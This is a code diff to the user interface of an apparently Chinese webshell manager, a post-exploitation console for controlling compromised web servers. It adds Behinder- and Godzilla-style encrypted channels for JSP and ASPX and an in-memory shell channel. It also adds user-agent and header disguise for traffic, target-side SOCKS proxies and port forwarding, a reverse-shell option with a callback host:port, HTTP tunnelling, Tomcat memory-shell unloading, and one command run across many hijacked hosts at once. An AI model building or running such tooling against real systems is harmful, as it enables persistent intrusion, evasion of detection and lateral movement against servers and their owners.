@@ -229,7 +229,12 @@ var PROTOCOL_ROWS = [
 	{ id: "cmd-eval", label: "一句话（eval 通道）" },
 	{ id: "dsh-aes", label: "自研加密通道" },
 	{ id: "behinder", label: "冰蝎型通道（AES-ECB）" },
+	{ id: "behinder-java", label: "冰蝎型通道（JSP·AES-ECB·编译载荷）" },
+	{ id: "behinder-aspx", label: "冰蝎型通道（ASPX·AES-ECB·程序集载荷）" },
+	{ id: "godzilla-aspx", label: "哥斯拉型通道（ASPX·CSHAP_AES_BASE64）" },
 	{ id: "godzilla", label: "哥斯拉型通道（XOR_BASE64）" },
+	{ id: "godzilla-java", label: "哥斯拉型通道（JSP·JAVA_AES_BASE64）" },
+	{ id: "dsh-mem", label: "内存马通道（X-C 头触发）" },
 	{ id: "behinder-mod", label: "魔改冰蝎型通道" },
 	{ id: "godzilla-mod", label: "魔改哥斯拉型通道" }
 ];
@@ -241,7 +246,7 @@ function ConnForm(props) {
 		name: editing.name || "", url: editing.url || "", protocol: editing.protocol || "cmd-system",
 		shell_lang: editing.shell_lang || "php", pass_param: editing.pass_param || "pass", cmd_param: editing.cmd_param || "cmd",
 		password: "", secret_key: editing.secretKey || "", method: editing.method || "post",
-		encoding: editing.encoding || "auto", os: editing.os || "auto", kind: editing.kind || "file", remark: editing.remark || "", timeout_ms: editing.timeoutMs || 20000
+		encoding: editing.encoding || "auto", os: editing.os || "auto", kind: editing.kind || "file", remark: editing.remark || "", profile_json: editing.profile_json || "", timeout_ms: editing.timeoutMs || 20000
 	};
 	var d = useState(draft0), draft = d[0], setDraft = d[1];
 	var busy = useState(false);
@@ -258,6 +263,7 @@ function ConnForm(props) {
 				set("protocol", r.protocol);
 				set("shell_lang", r.shellLang);
 				set("os", r.os);
+				if (r.kindHint) set("kind", r.kindHint);
 				msg[1]("");
 			} else msg[1]("未识别：" + r.error);
 		}).catch(function (e) { busy[1](false); msg[1](String(e)); });
@@ -279,7 +285,7 @@ function ConnForm(props) {
 			h("h3", null, editing.id ? "编辑连接" : "新建连接"),
 			h(Notice, { msg: msg[0], kind: "error" }),
 			h("div", { className: "dsh-wsm-row" },
-				h("input", { className: "dsh-wsm-input mono", style: { flex: 1, minWidth: 240 }, placeholder: "http://target/shell.php", value: draft.url, onChange: function (e) { set("url", e.target.value); } }),
+				h("input", { className: "dsh-wsm-input mono", style: { flex: 1, minWidth: 240 }, placeholder: "http://target/shell.php（内存马填任意存活路径）", value: draft.url, onChange: function (e) { set("url", e.target.value); } }),
 				h(Btn, { disabled: busy[0], onClick: autoDetect }, busy[0] ? "识别中…" : "自动识别")),
 			detected[0] ? h("div", { className: "dsh-wsm-notice" },
 				"已识别：" + detected[0].protocol + " / " + detected[0].shellLang + " / OS=" + detected[0].os,
@@ -306,6 +312,7 @@ function ConnForm(props) {
 					["auto", "utf-8", "gbk", "gb18030"].map(function (l) { return h("option", { key: l, value: l }, l); }))),
 				h(Field, { label: "超时(ms)" }, h("input", { className: "dsh-wsm-input", type: "number", value: draft.timeout_ms, onChange: function (e) { set("timeout_ms", Number(e.target.value) || 20000); } }))),
 			h(Field, { label: "备注" }, h("input", { className: "dsh-wsm-input", value: draft.remark, onChange: function (e) { set("remark", e.target.value); } })),
+			h(Field, { label: "流量伪装 profile（JSON，可选）" }, h("textarea", { className: "dsh-wsm-input mono", style: { minHeight: 54, fontFamily: "monospace" }, placeholder: '{"uas":["UA1","UA2"],"headers":{"X-A":"1"},"strip":["<<",">>"]}', value: draft.profile_json, onChange: function (e) { set("profile_json", e.target.value); } })),
 			h("div", { className: "dsh-wsm-row", style: { justifyContent: "flex-end" } },
 				h(Btn, { onClick: props.onClose }, "取消"),
 				h(Btn, { primary: true, disabled: busy[0], onClick: save }, "保存"))));
@@ -319,6 +326,15 @@ function OverviewPane(props) {
 	var conn = props.conn;
 	var ops = useState(null);
 	var probing = useState(false);
+	var unloadMenu = useState(null);
+	var unloadName = useState("");
+	var unloadBusy = useState(false);
+	var netMenu = useState(null);
+	var netKind = useState("socks");
+	var netPort = useState("18080");
+	var netHost = useState("");
+	var netTarget = useState("");
+	var netBusy = useState(false);
 	useEffect(function () {
 		ops[1](null);
 		if (conn) api("ops.recent", { connId: conn.id, limit: 30 }).then(ops[1]).catch(function () { ops[1]({ ops: [] }); });
@@ -333,16 +349,79 @@ function OverviewPane(props) {
 			conn.kind === "mem" ? h(Pill, { tone: "ok" }, "内存马") : null,
 			h(Pill, { tone: conn.last_status === "ok" ? "ok" : conn.last_status === "dead" ? "dead" : "" }, conn.last_status),
 			h("span", { className: "dsh-wsm-spacer" }),
+			conn.kind === "mem" ? (conn.protocol === "behinder-java"
+				? h(Btn, { small: true, onClick: function (e) {
+					var r = e.currentTarget.getBoundingClientRect();
+					unloadMenu[1]({ anchor: { left: r.left, top: r.top, bottom: r.bottom } });
+				} }, "卸载内存马")
+				: h("span", { className: "dsh-wsm-sub", title: "X-C 头通道只能执行命令——卸载需 defineClass 载荷（behinder-java）" }, "卸载需 behinder-java 通道")) : null,
+			h(Btn, { small: true, onClick: function (e) {
+				var r = e.currentTarget.getBoundingClientRect();
+				netMenu[1]({ anchor: { left: r.left, top: r.top, bottom: r.bottom } });
+			} }, "网络"),
 			h(Btn, { small: true, disabled: probing[0], onClick: function () {
 				probing[1](true);
 				api("conn.probe", { id: conn.id }).then(function () { probing[1](false); props.onRefresh(); }).catch(function () { probing[1](false); });
 			} }, probing[0] ? "探测中…" : "重新探活")),
+		netMenu[0] ? h(Popover, { open: true, anchor: netMenu[0].anchor, onClose: function () { netMenu[1](null); }, title: "网络动作（目标侧载荷 / HTTP 隧道）", width: 380 },
+			h(Field, { label: "动作" }, h("select", { className: "dsh-wsm-select", value: netKind[0], onChange: function (e) { netKind[1](e.target.value); } },
+				conn.protocol === "behinder-java" || conn.protocol === "godzilla-java" ? h("option", { value: "socks" }, "SOCKS5（目标侧）") : null,
+				conn.protocol === "behinder-java" || conn.protocol === "godzilla-java" ? h("option", { value: "fwd" }, "端口转发（目标侧）") : null,
+				conn.protocol === "behinder-java" || conn.protocol === "godzilla-java" ? h("option", { value: "reverse" }, "反弹 shell") : null,
+				conn.protocol === "godzilla-java" ? h("option", { value: "tunnel.start" }, "HTTP 隧道（本地 SOCKS）") : null,
+				h("option", { value: "tunnel.status" }, "隧道状态"),
+				h("option", { value: "tunnel.stop" }, "停隧道（按本地端口）"))),
+			netKind[0] === "socks" ? h(Field, { label: "目标监听端口" }, h("input", { className: "dsh-wsm-input", value: netPort[0], onChange: function (e) { netPort[1](e.target.value); } })) : null,
+			netKind[0] === "fwd" ? h("div", { className: "dsh-wsm-row" },
+				h(Field, { label: "监听端口" }, h("input", { className: "dsh-wsm-input", value: netPort[0], onChange: function (e) { netPort[1](e.target.value); } })),
+				h(Field, { label: "目标 host:port" }, h("input", { className: "dsh-wsm-input mono", placeholder: "10.0.0.5:3306", value: netTarget[0], onChange: function (e) { netTarget[1](e.target.value); } }))) : null,
+			netKind[0] === "reverse" ? h("div", { className: "dsh-wsm-row" },
+				h(Field, { label: "回连 host:port" }, h("input", { className: "dsh-wsm-input mono", placeholder: "1.2.3.4:4444", value: netTarget[0], onChange: function (e) { netTarget[1](e.target.value); } }))) : null,
+			netKind[0] === "tunnel.start" || netKind[0] === "tunnel.stop" ? h(Field, { label: "本地 SOCKS 端口" }, h("input", { className: "dsh-wsm-input", value: netPort[0], onChange: function (e) { netPort[1](e.target.value); } })) : null,
+			h("div", { className: "dsh-wsm-notice" }, netKind[0] === "tunnel.start"
+				? "全部流量封装 web 请求（目标不开新端口）；本地配 SOCKS5 代理 127.0.0.1:端口"
+				: "动作入 op_log 台账；socks/fwd/reverse 为目标侧常驻线程（重启即消）"),
+			h("div", { className: "dsh-wsm-row", style: { justifyContent: "flex-end" } },
+				h(Btn, { disabled: netBusy[0], onClick: function () { netMenu[1](null); } }, "取消"),
+				h(Btn, { primary: true, disabled: netBusy[0], onClick: function () {
+					netBusy[1](true);
+					var payload = { connId: conn.id };
+					if (netKind[0] === "tunnel.start" || netKind[0] === "tunnel.stop") { payload.localPort = Number(netPort[0]) || 0; }
+					else if (netKind[0] === "tunnel.status") {}
+					else {
+						payload.kind = netKind[0];
+						if (netKind[0] === "socks") payload.port = Number(netPort[0]) || 18080;
+						if (netKind[0] === "fwd") { var hp = String(netTarget[0] || "").split(":"); payload.listen = Number(netPort[0]) || 0; payload.host = hp[0] || ""; payload.port = Number(hp[1]) || 0; }
+						if (netKind[0] === "reverse") { var hp2 = String(netTarget[0] || "").split(":"); payload.host = hp2[0] || ""; payload.port = Number(hp2[1]) || 0; }
+					}
+					api(netKind[0] && netKind[0].startsWith("tunnel") ? netKind[0] : "net.action", payload).then(function (r) {
+						netBusy[1](false);
+						var text = r.output || JSON.stringify(r);
+						if (r.tunnels) text = r.tunnels.length ? r.tunnels.map(function (t) { return "本地 :" + t.port + "（" + t.sessions + " 会话）"; }).join("；") : "（无活跃隧道）";
+						alert("结果：" + text);
+						netMenu[1](null);
+					}).catch(function (e) { netBusy[1](false); alert("失败：" + String(e)); });
+				} }, netBusy[0] ? "执行中…" : "执行"))) : null,
+		unloadMenu[0] ? h(Popover, { open: true, anchor: unloadMenu[0].anchor, onClose: function () { unloadMenu[1](null); unloadName[1](""); }, title: "卸载内存马（Tomcat Filter 三注册面移除）", width: 360 },
+			h("div", { className: "dsh-wsm-notice" }, "Filter 名留空 = 自动读引导器登记（本插件引导器注入的马）。卸载后该连接即断（预期行为）。"),
+			h(Field, { label: "Filter 名（可选）" }, h("input", { className: "dsh-wsm-input mono", value: unloadName[0], onChange: function (e) { unloadName[1](e.target.value); }, placeholder: "x-xxxxxxxx（留空自动定位）" })),
+			h("div", { className: "dsh-wsm-row", style: { justifyContent: "flex-end" } },
+				h(Btn, { disabled: unloadBusy[0], onClick: function () { unloadMenu[1](null); unloadName[1](""); } }, "取消"),
+				h(Btn, { primary: true, disabled: unloadBusy[0], onClick: function () {
+					unloadBusy[1](true);
+					api("mem.unload", { connId: conn.id, name: unloadName[0] }).then(function (r) {
+						unloadBusy[1](false); unloadMenu[1](null); unloadName[1]("");
+						props.onRefresh && props.onRefresh();
+						alert("卸载结果：" + (r.output || "ok") + "——连接已断属预期");
+					}).catch(function (e) { unloadBusy[1](false); alert("卸载失败：" + String(e)); });
+				} }, unloadBusy[0] ? "卸载中…" : "确认卸载"))) : null,
 		h("div", { className: "dsh-wsm-kv" },
 			h("dt", null, "地址"), h("dd", { className: "dsh-wsm-mono" }, conn.url),
 			h("dt", null, "当前用户"), h("dd", { className: "dsh-wsm-mono" }, info.user || "—"),
 			h("dt", null, "工作目录"), h("dd", { className: "dsh-wsm-mono" }, info.cwd || "—"),
 			h("dt", null, "系统"), h("dd", { className: "dsh-wsm-mono" }, (info.osDetail || info.os || conn.os) || "—"),
 			info.php ? h("dt", null, "PHP") : null, info.php ? h("dd", { className: "dsh-wsm-mono" }, info.php + " / " + (info.sapi || "")) : null,
+			info.java ? h("dt", null, "Java") : null, info.java ? h("dd", { className: "dsh-wsm-mono" }, info.java + (info.cpus ? "（" + info.cpus + " 核）" : "")) : null,
 			info.disabledFunctions ? h("dt", null, "禁用函数") : null, info.disabledFunctions ? h("dd", { className: "dsh-wsm-mono" }, String(info.disabledFunctions).slice(0, 300)) : null,
 			h("dt", null, "备注"), h("dd", null, conn.remark || "—"),
 			h("dt", null, "最近探活"), h("dd", null, fmtTime(conn.last_probe_at) || "—")),
@@ -374,6 +453,13 @@ function TerminalPane(props) {
 	var menu = useState(null);
 	var boxRef = useRef(null);
 	var st = props.connState || {};
+	var interactive = useState(false); // 交互模式（godzilla-java：持久会话终端 e.* ops）
+	var interTid = useState("");
+	var pollTimer = useRef(null);
+	useEffect(function () {
+		// 离开/切换连接时收尾交互会话
+		return function () { if (pollTimer.current) clearInterval(pollTimer.current); };
+	}, [conn && conn.id]);
 	useEffect(function () {
 		if (!conn || !props.stateReady) return;
 		lines[1]((st.terminal && st.terminal.lines) || []);
@@ -386,8 +472,36 @@ function TerminalPane(props) {
 	function push(kind, text) {
 		lines[1](function (p) { return p.concat([{ k: kind, t: text }]).slice(-400); });
 	}
+	function stopPoll() { if (pollTimer.current) { clearInterval(pollTimer.current); pollTimer.current = null; } }
+	function toggleInteractive() {
+		if (!interactive[0]) {
+			api("term.action", { connId: conn.id, action: "open", cmdline: "" }).then(function (r) {
+				interTid[1](r.tid);
+				interactive[1](true);
+				push("sys", "交互模式已开启（持久会话——输出轮询中，exit 或关闭按钮退出）");
+				stopPoll();
+				pollTimer.current = setInterval(function () {
+					api("term.action", { connId: conn.id, action: "read", tid: interTid[0] }).then(function (r2) {
+						if (r2.data) push("out", r2.data.replace(/\n$/, ""));
+						if (r2.exited) { stopPoll(); interactive[1](false); push("sys", "会话已退出"); }
+					}).catch(function () { stopPoll(); interactive[1](false); });
+				}, 400);
+			}).catch(function (e) { push("err", "交互模式开启失败：" + String(e)); });
+		} else {
+			stopPoll();
+			api("term.action", { connId: conn.id, action: "close", tid: interTid[0] }).catch(function () {});
+			interactive[1](false);
+			push("sys", "交互模式已关闭");
+		}
+	}
 	function run(cmd) {
 		if (!cmd || busy[0]) return;
+		if (interactive[0]) {
+			push("cmd", cmd);
+			hist[1](function (p) { return p.concat([cmd]).slice(-100); });
+			api("term.action", { connId: conn.id, action: "write", tid: interTid[0], data: cmd + "\n" }).catch(function (e) { push("err", String(e)); });
+			return;
+		}
 		busy[1](true);
 		push("cmd", cmd);
 		hist[1](function (p) { return p.concat([cmd]).slice(-100); });
@@ -405,6 +519,7 @@ function TerminalPane(props) {
 				var rect = e.currentTarget.getBoundingClientRect();
 				menu[1]({ anchor: { left: rect.left, top: rect.top, bottom: rect.bottom, right: rect.right } });
 			} }, "快捷命令"),
+			conn.protocol === "godzilla-java" ? h(Btn, { small: true, primary: interactive[0], onClick: toggleInteractive, title: "持久会话终端（WsmG e.* ops）——状态跨命令保持" }, interactive[0] ? "交互中（点击退出）" : "交互模式") : null,
 			h("span", { className: "dsh-wsm-spacer" }),
 			h(Btn, { small: true, onClick: function () {
 				var text = lines[0].map(function (l) { return (l.k === "cmd" ? "$ " : "") + l.t; }).join("\n");
@@ -744,7 +859,7 @@ function FilesPane(props) {
 
 //#region 数据库
 
-var DB_TYPES = ["mysql", "pgsql", "sqlite", "mssql"];
+var DB_TYPES = ["mysql", "pgsql", "sqlite", "mssql", "oracle"];
 
 function DbPane(props) {
 	var conn = props.conn;
@@ -842,7 +957,9 @@ function DbPane(props) {
 					h(Field, { label: editing[0].id ? "密码（留空保持不变）" : "密码" }, h("input", { className: "dsh-wsm-input mono", type: "password", value: editing[0].password, onChange: function (e) { editing[1](Object.assign({}, editing[0], { password: e.target.value })); } })),
 					h(Field, { label: editing[0].type === "sqlite" ? "库文件路径" : "库名" }, h("input", { className: "dsh-wsm-input mono", value: editing[0].database, onChange: function (e) { editing[1](Object.assign({}, editing[0], { database: e.target.value })); } }))),
 				h(Field, { label: "备注" }, h("input", { className: "dsh-wsm-input", value: editing[0].remark, onChange: function (e) { editing[1](Object.assign({}, editing[0], { remark: e.target.value })); } })),
-				h(Notice, { msg: "需 eval 能力通道（PHP eval 马或自研加密马 v2）——数据库走目标机 PDO 原生驱动。", kind: "info" }),
+				h(Notice, { msg: conn.protocol === "behinder-java"
+					? "behinder-java 通道：数据库走目标应用 JDBC 驱动（mysql/mssql/pgsql/oracle——目标机自带驱动 jar 即可）。"
+					: "需 eval 能力通道（PHP eval 马或自研加密马 v2）——数据库走目标机 PDO 原生驱动。behinder-java 通道可用 JDBC。", kind: "info" }),
 				h("div", { className: "dsh-wsm-row", style: { justifyContent: "flex-end" } },
 					h(Btn, { onClick: function () { editing[1](null); } }, "取消"),
 					h(Btn, { primary: true, onClick: function () {
@@ -1062,6 +1179,11 @@ function WebshellView(props) {
 	var editing = useState(null);
 	var connMenu = useState(null);
 	var search = useState("");
+	var batchMenu = useState(null);
+	var batchSel = useState({});
+	var batchCmd = useState("whoami");
+	var batchBusy = useState(false);
+	var batchResult = useState(null);
 	var states = useState({});
 	var statesRef = useRef({});
 	var persistTimers = useRef({});
@@ -1106,7 +1228,42 @@ function WebshellView(props) {
 			conn ? h(Pill, { tone: "accent" }, conn.protocol) : null,
 			conn ? h(Pill, null, conn.shell_lang + " / " + conn.os) : null,
 			h("span", { className: "dsh-wsm-spacer" }),
+			h(Btn, { small: true, onClick: function (e) {
+				var r = e.currentTarget.getBoundingClientRect();
+				batchMenu[1]({ anchor: { left: r.left, top: r.top, bottom: r.bottom } });
+			} }, "批量执行"),
 			h(Btn, { small: true, onClick: function () { editing[1](null); formOpen[1](true); } }, "新建连接")),
+		batchMenu[0] ? h(Popover, { open: true, anchor: batchMenu[0].anchor, onClose: function () { batchMenu[1](null); batchResult[1](null); }, title: "批量执行（多连接同一命令）", width: 460 },
+			h("div", { className: "dsh-wsm-scrollbox", style: { maxHeight: "26vh", marginBottom: 6 } },
+				(conns[0] || []).length === 0 ? h("div", { className: "dsh-wsm-sub", style: { padding: 6 } }, "（无连接）") :
+				(conns[0] || []).map(function (c) {
+					return h("label", { key: c.id, className: "dsh-wsm-menu-item", style: { display: "flex", alignItems: "center", gap: 6 } },
+						h("input", { type: "checkbox", checked: !!batchSel[0][c.id], onChange: function (e) {
+							batchSel[1](function (p) { var n = Object.assign({}, p); n[c.id] = e.target.checked; return n; });
+						} }),
+						h("span", { className: "dsh-wsm-mono", style: { flex: 1 } }, (c.name || c.url)),
+						h("span", { className: "dsh-wsm-sub" }, c.protocol));
+				})),
+			h(Field, { label: "命令" }, h("input", { className: "dsh-wsm-input mono", value: batchCmd[0], onChange: function (e) { batchCmd[1](e.target.value); } })),
+			h("div", { className: "dsh-wsm-row", style: { justifyContent: "flex-end" } },
+				h(Btn, { disabled: batchBusy[0], onClick: function () { batchMenu[1](null); batchResult[1](null); } }, "取消"),
+				h(Btn, { primary: true, disabled: batchBusy[0], onClick: function () {
+					var ids = Object.keys(batchSel[0]).filter(function (k) { return batchSel[0][k]; });
+					if (!ids.length || !batchCmd[0]) return;
+					batchBusy[1](true);
+					api("conn.batch", { ids: ids, command: batchCmd[0] }).then(function (r) {
+						batchBusy[1](false);
+						batchResult[1](r.results || []);
+					}).catch(function (e) { batchBusy[1](false); alert("批量失败：" + String(e)); });
+				} }, batchBusy[0] ? "执行中…" : "执行（" + Object.keys(batchSel[0]).filter(function (k) { return batchSel[0][k]; }).length + "）")),
+			batchResult[0] ? h("div", { className: "dsh-wsm-scrollbox", style: { maxHeight: "24vh", marginTop: 6 } },
+				h("table", { className: "dsh-wsm-table" },
+					h("thead", null, h("tr", null, h("th", null, "连接"), h("th", null, "结果"))),
+					h("tbody", null, batchResult[0].map(function (r, i) {
+						return h("tr", { key: i },
+							h("td", { className: "dsh-wsm-mono" }, r.name || r.id),
+							h("td", { className: "wrap dsh-wsm-mono", style: { color: r.ok ? "" : "#e5484d" } }, r.ok ? String(r.output).slice(0, 300) : "失败：" + r.error));
+					})))) : null) : null,
 		h("div", { className: "dsh-wsm-main" },
 			h("div", { className: "dsh-wsm-rail" + (railOpen[0] ? "" : " is-collapsed") },
 				h("div", { className: "dsh-wsm-rail-head" },
